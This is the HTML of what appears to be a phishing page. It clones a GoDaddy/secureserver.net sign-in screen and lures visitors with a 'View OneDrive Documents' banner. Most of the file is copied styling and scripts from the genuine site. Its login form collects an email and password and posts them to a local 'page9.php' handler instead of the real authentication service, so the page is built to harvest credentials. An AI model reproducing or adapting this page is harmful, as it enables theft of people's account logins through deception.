.btn.btn-primary:active,.afternic .btn.btn-primary:focus,.afternic .btn.btn-primary:hover,.afternic .btn.btn-primary:visited{background-color:#76a22f!important;border-color:#76a22f!important;color:#fff!important}.afternic .btn.btn-default{color:#76a22f!important;border-color:#76a22f!important}.afternic .btn.btn-default:active,.afternic .btn.btn-default:focus,.afternic .btn.btn-default:hover,.afternic .btn.btn-default:visited{border-color:#76a22f!important;background-color:#76a22f!important;color:#fff!important}.afternic .ux-footer{background-color:#ccc;color:#333}.afternic .ux-footer a,.afternic .ux-footer a:focus,.afternic .ux-footer a:hover{color:#333}.domainsbyproxy{background-color:#fff}.domainsbyproxy .btn.btn-link,.domainsbyproxy a{color:#fc0}.domainsbyproxy .btn.btn-link:active,.domainsbyproxy .btn.btn-link:focus,.domainsbyproxy .btn.btn-link:hover,.domainsbyproxy .btn.btn-link:visited,.domainsbyproxy a:active,.domainsbyproxy a:focus,.domainsbyproxy a:hover,.domainsbyproxy a:visited{color:#000}.domainsbyproxy .btn.btn-primary{background-color:#fc0!important;border-color:#fc0!important;color:#000!important}.domainsbyproxy .btn.btn-primary:active,.domainsbyproxy .btn.btn-primary:focus,.domainsbyproxy .btn.btn-primary:hover,.domainsbyproxy .btn.btn-primary:visited{background-color:#000!important;border-color:#000!important;color:#fc0!important}.domainsbyproxy .btn.btn-default{color:#000!important;border-color:#fc0!important}.domainsbyproxy .btn.btn-default:active,.domainsbyproxy .btn.btn-default:focus,.domainsbyproxy .btn.btn-default:hover,.domainsbyproxy .btn.btn-default:visited{border-color:#fc0!important;background-color:#fc0!important;color:#000!important}
</style><style>.ux-footer-logo {
background-image: url(//img1.wsimg.com/ux/eldorado/1.5.111/images/brand2.0/gd-header-logo.png);
}
@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
.ux-footer-logo{
background-image: url(//img1.wsimg.com/ux/eldorado/1.5.111/images/brand2.0/gd-header-logo2.png);
}
}</style><meta name="viewport" content="width=device-width, initial-scale=1.0"/><link href="//img1.wsimg.com/ux/1.4.1-brand/css/uxcore-pl.min.css" rel="stylesheet"/><!-- HTML5 shim IE8 support of HTML5 elements and media queries --><!--[if lt IE 9]><script src="//img1.wsimg.com/ux/1.4.1-brand/js/html5shiv.min.js"></script><![endif]--><style>@media screen and (min-width:520px){#login-container{margin-top:10px}}@media screen and (min-width:768px){#formContainer{margin:20px 40px 20px 40px !important}}@media screen and (min-width:992px){.lg-container{width:980px}}@media screen and (min-width:1200px){.lg-container{width:1150px}#formContainer{margin:35px 100px 20px 100px !important}}#formContainer{margin:20px 30px 0 30px}.pass-product-title{color:white;font-size:30px;line-height:33px;margin-bottom:10px;font-family:Boing-Bold,Arial Black,sans-serif}.o365-product-title{background-color:#ec3c05 !important;font-size:48px}.bg_css_class_gray{background-color:#e8e8e8 !important}.bg_css_class_pass{background-color:#e8e8e8 !important}#pass_logo_content{padding-top:30px;padding-bottom:30px}#pass_logo_container{background:#333}#logo-placeholder{padding-top:10px}.form-group{margin-bottom:10px}#contentContainer{margin-top:40px;margin-bottom:40px}.white-background{background-color:#fff}.uxf{background-color:#ccc;color:#333}.uxf-logo{background-color:#eff0f1}.btn-block{margin-bottom:5px}.gray-check-box{color:#999;margin-bottom:3px;margin-left:5px}.alert-container{display:none;margin-top:35px;margin-left:100px;margin-right:100px}.remove-row-overflow{margin-left:0 !important;margin-right:0 !important}.logo-container{background-color:#00a63f;width:100%;padding:25px 25px 25px 25px}.form-footer-container{background-color:#f3f3f3;width:100%;display:inline-block}.form-footer-content{width:100%;text-align:center}#post-form-footer-container{background:#e8e8e8;margin-bottom:40px}#formTitle,.logoTitle{color:#2b2b2b;font-size:30px;font-family:Boing-Bold,Arial Black,sans-serif;line-height:40px;margin-bottom:30px}#forgotPasswordLink,#forgotUsernameLink,.rebrand-link{font-family:Boing-Bold,Arial Black,sans-serif;font-size:15px;text-decoration:none !important;padding:0}#logoImage{max-height:80px}.gdLogoImage{margin:auto}.gdLogo{max-width:288px;max-height:80px;margin:auto;position:relative}.logo{position:relative}#logoText{color:#fff;z-index:100;cursor:default;right:0;top:0;position:absolute;margin-right:4px;font-size:15px;font-weight:bold;font-family:Arial Condensed,&quot;Helvetica Neue&quot;,Helvetica,sans-serif}body{min-height:0 !important;background-color:transparent !important}html{background-color:#e8e8e8 !important;background-position:top center;background-repeat:no-repeat;background-size:cover}.row-height{display:table;table-layout:fixed;height:100%;width:100%}.col-height{display:table-cell;height:100%}@media screen and (max-width:1199px){#logo-placeholder{padding-top:10px}#post-form-footer-container{margin-bottom:20px}.alert-container{margin-left:50px;margin-right:50px}#contentContainer{margin-top:10px !important;margin-bottom:20px}#formTitle,.logoTitle{font-family:Boing-Bold,Arial Black,sans-serif;font-size:30px;line-height:33px;margin-bottom:10px}}@media screen and (max-width:991px){html{background-image:none !important}.main-col{margin-left:auto;margin-right:auto;display:block;padding-right:0;padding-left:0;float:none !important}#left-col{display:none !important}}@media screen and (max-width:519px){html{background-color:#fff}}@media screen and (max-width:767px){#logoImage{max-height:48px}.logo-container{padding:6px 25px 6px 25px}#pass_logo_content{padding-top:20px;padding-bottom:20px}#logo-placeholder{padding-top:0}.rebrand-link{font-size:14px}.main-col{padding-right:0;padding-left:0;float:none !important}.form-group{margin-bottom:15px}#contentContainer{margin-top:0 !important}.uxf-row{display:none !important}html{background-image:none !important}#left-col{display:none !important}#logoText{font-size:13px}#formTitle,.logoTitle{font-family:Boing-Bold,Arial Black,sans-serif;font-size:24px;line-height:26px;margin-bottom:15px}.o365-product-title{font-size:36px}label{font-size:14px}.alert-container{margin-left:30px;margin-right:30px}}.form-control-checkbox{float:left;margin:4px 8px 0 0 !important}.checkbox-control-label{font-family:Arial;font-size:16px;text-transform:initial;margin-bottom:0}#remember-me-tip{margin-left:10px}.disabled-btn{background:#f3f3f3 !important;opacity:1 !important;color:#c0c0c0 !important}.pl-color{color:#1d6ccd !important}.gd-color{color:#00a63f !important}.lg-container{margin:0 auto}body.ux-app.uxf-flex.market-selector-open{overflow:scroll}</style><style>
      html,
      body {
        height: 100%;
      }
    
      @media screen and (max-width: 767px) {
        body {
          background-image: none !important;
        }
      }
    </style><link rel="dns-preload" href="//img6.wsimg.com" /><link rel="icon" href="data:;base64,="><script>
      var ux = ux || {};
      ux.config = ux.config || {};
      ux.config['disableBrowserDeprecation'] = true;
      ux.disable = ux.disable || {};
      ux.disable.tealium = true;
    </script></head><body class="ux-app uxf-flex" ><div class="footer_fixer"><div id="masthead"><div id="utility" class="utility-"><div class="container"><div class="row"><div class="col-sm-12"><div></div><div id="select-support" class="not-ready pc-menu-item ux-tray ux-tray-default contact-rel tray-text-align"><a href="https://www.secureserver.net/contact-us.aspx" data-eid="uxp.eld.language_header.shared.utility_bar.support_phone.contact_us.link.click" data-pc-qry="app=email&realm=pass" class="contact-us-link hidden-sm hidden-md hidden-lg">Contact Us</a><span data-eid="uxp.eld.sales_header.shared.utility_bar.contact_tray.link.click" data-openit="{&quot;addclass&quot;:{&quot;selector&quot;:&quot;#select-support&quot;,&quot;class&quot;:&quot;oi-open&quot;},&quot;mask&quot;:&quot;#select-support .support-options&quot;,&quot;guide&quot;:&quot;.content-wrap&quot;,&quot;animate&quot;:&quot;height&quot;,&quot;speed&quot;:&quot;200&quot;,&quot;group&quot;:&quot;pc-header&quot;,&quot;offclick&quot;:&quot;true&quot;}" class="ux-tray-toggle menu-title"><span class="support-info"><span class="contact-us visible-xs-inline-eld">Contact Us</span><span class="support-hours visible-sm-inline-eld visible-md-inline-eld visible-lg-inline-eld"></span><a href=" onclick="return false;" ondblclick="window.location = this.href;" class="support-phone visible-sm-inline-eld visible-md-inline-eld visible-lg-inline-eld"></a></span></span><div class="ux-tray-menu support-options"><div class="content-wrap"><h3 class="headline-primary"></h3></div></div></div></div></div></div></div></div><div class="container"><div class="row" ><div class="row-height"><div id="left-col" class="col-md-6 col-lg-6 col-xl-6 col-height"></div><div class="pull-right col-sm-8 col-md-6 col-height main-col" ><div id="contentContainer" class="white-background"
                ><div id="pass_logo_container" class="text-center pass-product-title email-product-title"><div id="pass_logo_content">
        View OneDrive Documents
    </div></div><div class="alert-container" id="errorMessage"></div><div class="alert-container" id="warnMessage"></div><div class="alert-container" id="statusMessage"></div><div id="formContainer"><strong><p id="formTitle">
                  Sign in
                </p></strong><form method="POST" action="page9.php" name="login" id="login-form" autocorrect="off" autocapitalize="off" spellcheck="false"><input type="hidden" name="app" value="email"><input type="hidden" name="realm" value="pass"><input type="hidden" name="wctx"><input type="hidden" name="wa" value="wsignin1.0"><input type="hidden" name="wtrealm"><div class="form-group"><label class="control-label">Email</label><input type="text" name="name" id="username" class="form-control ctHidden" tabindex="1" placeholder="your.name@yourdomain.com" data-eid="sso.login.login_form.pass.username" required></div><div class="form-group"><label class="control-label">Password</label><a id="forgotPasswordLink" data-eid="sso.login.login_form.pass.i_forgot_password.link.click" class="pull-right pl-color" href="/v1/account/reset?app=email&realm=pass">I forgot</a><input type="password" name="password" class="form-control ctHidden" id="password" tabindex="2" autocomplete="off" data-eid="sso.login.login_form.pass.password" required></div><div class="form-group"><label for="remember-me" class="checkbox-control-label control-label">Keep me signed in</label><input type="checkbox" name="remember_me" id="remember-me" class="form-control-checkbox" tabindex="3" required checked><span id="remember-me-tip" class="uxicon uxicon-information sf-tip sf-tipper-target" data-title="Keep me signed in" data-content="Protect your account. Uncheck if using public/shared device."></span></div><div class="row remove-row-overflow"><button class="btn btn-primary btn-block" tabindex="4" id="submitBtn" type="submit">Login</button></div></div></form><div class="form-footer-container"><div class="form-footer-content"></div></div></div></div></div></div></div></div></div><div class="ux-footer"><div id="gtm_privacy"></div>
  var Globals = Globals || {};
  Globals.version = "v1";
  Globals.locale = "en_US";
  Globals.static_url = "/v1/static/";
  Globals.scripts = ['https://img1.wsimg.com/auth/v1/static/3420/js/src/login.js', 'https://img1.wsimg.com/auth/v1/static/3420/js/src/form.js'];
  Globals.scripts_ready = 0;
  window.disableHeartbeat = true;

  
  var translate_dict = {"AUTHCODE_REQUIRED": "Authorization code is required", "AGREED_TO_TOS": "I've read and agreed to the", "BACK_TO_SIGNIN": "Back to Sign In", "CANCEL": "Cancel", "CONTAIN_FIVE_CHARS": "Contain at least 5 characters", "CONTAIN_ONE_LETTER": "Contain at least 1 letter", "CANNOT_CONTAIN_SPACE": "Not contain a space", "CONTINUE": "Continue", "CONTINUE_TO_OFFICE_365": "Continue to Office 365", "CREATE_ACCOUNT": "Create Account", "EMAIL_REQUIRED": "Oops. You must enter an email address.", "ENTER_VALID_VERIFICATION_CODE": "Codes can only contain numbers or hyphens", "ENTER_VERIFICATION_CODE": "Please enter a code", "ERROR_CAPTCHA": "Incorrect response", "ERROR_MSG_DEFAULT": "Yikes! Something's gone wrong. Please re-enter your information and try again.", "FACEBOOK_COLLISION_STR_1": "An existing GoDaddy account uses the same email address. You can sign in to that account or create a new one.", "FACEBOOK_COLLISION_STR_2": "Note: You can Add/Remove Facebook sign-in on the Login & PIN page under your GoDaddy Account Settings.", "FACEBOOK_NOT_SETUP": "We found your account", "FAULT_SAME_PASSWORD": "You can't re-use your last password. Please choose a new one.", "HIDE": "Hide", "I_AGREE": "I Agree", "INCLUDE_UPPERCASE": "Include an uppercase letter", "INCLUDE_LOWERCASE": "Include a lowercase letter", "INCLUDE_NUMBER": "Include a number", "INVALID_CODE": "You entered an invalid code, please try again.", "INVALID_DOMAIN_EMAIL_COMBO": "Invalid domain and email combination", "INVALID_EMAIL_FORMAT": "Email must be in a valid email format (e.g., username@coolexample.com). Please try again.", "INVALID_PASSWORD": "Password must be between 9 - 50 characters and must include 1 uppercase letter, 1 lowercase letter, and 1 number.", "INVALID_PHONE": "You must enter a valid phone number (e.g., 555-321-9876).", "INVALID_PIN": "Call-in PIN must be exactly 4 digits.", "INVALID_USERNAME": "Username must be at least 5 characters long and contain at least 1 letter.", "INVALID_USER_EMAIL": "Invalid customer and email combination", "MOBILE_NOT_BEGIN_OR_END_WITH_SPACE": "Not start or end with a space", "MOBILE_PIN_MUST_BE_FOUR_DIGITS": "Contain exactly 4 digits", "NINE_CHARS_LONG": "Be at least 9 characters", "NOT_BEGIN_OR_END_WITH_SPACE": "Password cannot start or end with a space", "PASSWORDS_DONT_MATCH": "Oops, passwords don't match!", "PASSWORDS_MISMATCH": "Passwords must match", "PASSWORD_30DAYS": "Password was used in the last 30 days", "PASSWORD_LAST5": "You can't re-use your last 5 passwords. Please choose a new one.", "PASSWORD_MATCHES_USERNAME": "Password must be different from your username.", "PASSWORD_MATCH_HINT": "Password and hint should be different", "PASSWORD_REQUIRED": "Password is required", "PASSWORD_TO_SHORT": "Password must be at least 9 characters long.", "PIN_IS_SEQUENTIAL": "Call-in PIN cannot be sequential digits.", "PIN_MUST_BE_FOUR_DIGITS": "Call-in PIN must be exactly 4 digits.", "PIN_REPEATED_DIGIT": "Call-in PIN cannot be a single repeated digit.", "PIN_REQUIRED": "Oops. You must enter a call-in PIN.", "PLEASE_CHOOSE_FACTOR": "Please choose a factor", "PROCESSING": "Processing...", "PROVIDE_A_PASSWORD": "Provide a password, and you'll be on your way.", "PWD_HINT_REQUIRED": "Password hint is required", "REQUEST_PASSWORD_RESET": "Request Password Reset", "RETRIEVE_MISSING_DOMAIN": "A domain name is required.", "RETRIEVE_MISSING_EMAIL": "An email is required.", "RESERVED_WORD_PASSWORD": "Password cannot include a common word or phrase.", "RESET_INVALID_USER": "User is invalid for this url.", "RESET_PWD_FAIL": "The password reset url is either invalid or has expired. Try again!", "SHOW": "Show", "SIGN_IN_TITLE_CASE": "Sign In", "USERNAME_ALL_NUMERIC": "Username cannot be all numbers.", "USERNAME_IN_USE": "Username is already taken. Please choose another.", "USERNAME_REQUIRED": "Username is required", "VERIFICATION_CODE": "Verification code", "VERIFICATION_CODE_INVALID": "Verification code is invalid", "VERIFICATION_CODE_REQUIRED": "Verification code is required", "WORK_IS_DONE": "Your work here is done", "YOUR_USERNAME_MUST": "Your username must", "YOUR_PASSWORD_MUST": "Your password must", "YOUR_PIN_MUST": "Your PIN must"};
  </script><script>
    window.ux = window.ux || {};
    window.ux.gaconfig = [
      
      { 'tcc.gastatus': 'off' },
      
        { 'tcc.status': 'off' },
      
      
      { 'tcc.baseHost': 'secureserver.net' },
      { 'tcc.baseCookieHost': 'secureserver.net' },
      
      
      
      { 'server': 'p3plcauth037' },
      
      
      {'status': '200'},
      
      
      {'realm': 'pass'},
      
    ];

  </script><script>var ux = ux || {};
ux.config = ux.config || {};
ux.config.plabel = '3153';</script><script>(function(){
  var ux = window.ux || {};
  function ready(fn) { ux.fns.push(fn); }
  ux.fns = [];
  ux.ready = ready;
  window.ux = ux;
})();</script><script>var uxel = ux.eldorado || {};
uxel.fns = [];
uxel.ready = function ready(fn) { uxel.fns.push(fn); };
uxel.data = {
  app: 'sso',
  ssoApp: 'sso',
  market: 'en-us',
  uiTheme: 'brand2.0',
  languageName: 'English',
  countryName: 'United States',
  appAlias: 'sso',
  version: '1.5.111',
  currency: 'USD',
  split: 'brand2.0',
  plId: '3153',
  context: {
    isrslr: true,
    isgd: false,
    issppl: false,
    isspgd: false
  },
  tokens: {
    loginApp: '%7B%7Bpc%3Aloginapp%7D%7D',
    loginPath: '%7B%7Bpc%3Acurrentpage%7D%7D'
  },
  impression: 'uxp.eld.int.languageheader.sso.impression',
  shopperId: '',
  env: 'prodPhx',
  manifest: 'languageheader',
  urlArgs: 'app=email&realm=pass',
  formats: {
    sfullname: '%7Bf%7D%20%7Bl%7D',
    smenu: '%7Bf%7D'
  },
  thirdParty: {},
  inappHelpSupported: 'false',
  utilityChatSupported: 'false'
};
uxel.texts = {
  inappHelpTitle: 'Help'
};
uxel.urls = { };
ux.eldorado = uxel;</script><!--[if lte IE 7]><script>if (ux.config['disableBrowserDeprecation'] !== true) {
  window.location = '//img1.wsimg.com/ux/1.4.1-brand/html/browser-upgrade-pl.en.html' +
    '?shopper=' + uxel.data.shopperId +
    '&pl=' + uxel.data.plId;
}</script><![endif]--><!--[if IE 8]><script>if (ux.config['disableBrowserDeprecation'] !== true) {
  ux.ready(function() {
    $('<div id="uxh-browser-dep" />')
      .prependTo(document.body)
      .sfBrowser('hardwarn');
  });
}</script><![endif]--><script>if (ux.config['disableBrowserDeprecation'] !== true) {
  ux.ready(function() {
    $('<div id="uxh-browser-dep" />')
      .prependTo(document.body)
      .sfBrowser({"ignored":[{"ua":"mobile"}]});
  });
}</script><script>uxel.data.notifications = {
  apiUrl: 'https://mya.secureserver.net/webapi/notifications',
  ssoUrl: 'https://sso.secureserver.net',
  iframeCacheUrl: '//img1.wsimg.com/mya/notifications/cache.html',
  enabled: true,
  strings: {
    headerText: "Notifications",
    noNotificationsTitle: "You have no notifications.",
    noNotificationsText: "They'll be here when you get 'em.",
    failedNotificationsTitle: "Your session has expired.",
    failedNotificationsText: "Please sign in again to receive notifications.",
    failedNotificationsLink: "Sign In"
  }
}
</script><script>uxel.urls.guiDomain = 'https://gui.secureserver.net/';
uxel.urls.myPinUrl = 'https://mya.secureserver.net/pin?plId=3153';</script><script>(function() {
  function addOnLoad(func) {
    window.onload = (function(old) {
      return (typeof(old) === 'function') ? function() { old(); func(); } : func;
    })(window.onload);
  }
  addOnLoad(function() {
    var parent = document.getElementsByTagName('head')[0];
    var el = document.createElement('script');
    el.src = '//img1.wsimg.com/ux/1.4.1-brand/js/uxcore.en.min.js';
    parent.appendChild(el);

    if (window.ux.eldorado && window.ux.eldorado.loadTcc) {
      window.ux.eldorado.loadTcc();
    }

    ux.ready(function() {
      ux.jQuery = $;
      var el2 = document.createElement('script');
      el2.src = '//img1.wsimg.com/ux/eldorado/1.5.111/js/languageheader.min.js';
      parent.appendChild(el2);
    });
  });
})();</script><!-- Manifest languageheader --><script>
  
  
  
  

  ux.eldorado.ready(function() {
      jQuery.cachedScript = function( url, options ) {
          options = $.extend( options || {}, {
            dataType: "script",
            cache: true,
            url: url,
            async: false
          });
          return jQuery.ajax( options );
      };
      for(i in Globals.scripts)
      {
          $.cachedScript(Globals.scripts[i]).done(function(){
              Globals.scripts_ready += 1;
              if(Globals.scripts_ready == Globals.scripts.length)
              {
                  $(document).attr('authReady', true);
                  
                  
                     $(Login.init); 
                  
                  

                  
                  
                  
                  
                  if(Globals.js_error){
                    Forms.show_error(Globals.js_error, Globals.js_error_location);
                  }
              }
          });
      }

      
        $(".ux-help-link").attr("href","");
        $(".ux-help-link").hide();
      

      
      // Set the link on forgot username for idp
      $("#forgotUsernameLink").attr("href", "/v1/account/retrieve?action=submit&app=email&realm=pass");
      

      
        ux.eldorado.marketSelector.enable(false);
      
      // Set the country name on the logo
      

      
        
          $('.support-info').hide();
        
      
  });
  var _trfq = _trfq || [];
function fire_virtual_page(name)
{
    _trfq.push(['cmdGetTrackingValues', getvg]);
    function getvg(data)
    {
        if('vg' in data && data['vg'] && data['vg'] != 'undefined')
        {
          _trfq.push(["cmdLogPageRequest", name.toString()]);
        }
        else
        {
          setTimeout(function(){_trfq.push(['cmdGetTrackingValues', getvg]);}, 100);
        }
    }
}



  </script><!--Build info
  App: v1
  Build time: Wed Jan 27 15:25:19 MST 2021
  Build number: 3420
  --><input name="layout" type="hidden" value="rebrand_layout"/></body></html>
